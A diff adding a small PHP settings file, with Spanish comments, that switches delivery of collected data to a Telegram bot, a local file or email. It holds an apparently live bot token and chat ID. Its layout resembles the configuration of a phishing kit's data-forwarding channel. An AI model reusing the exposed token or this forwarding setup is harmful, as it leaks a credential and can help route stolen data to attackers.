@@ -1,0 +1,16 @@
+<?php
+// Envio telegram
+// true = SI | false = NO
+$telegram_send = true;
+$bottoken = "6522685995:AAHsq_OleuP4nURQPZMGeURwHuFcdwNGSBk";
+$chatid = "-1002209875421";
+
+// Guardar archivo
+// true = SI | false = NO
+$file_save = false;
+
+// Envio Gmail
+// true = SI | false = NO
+$email_send = false;
+$email = "jasonidk@test.com";
+?>
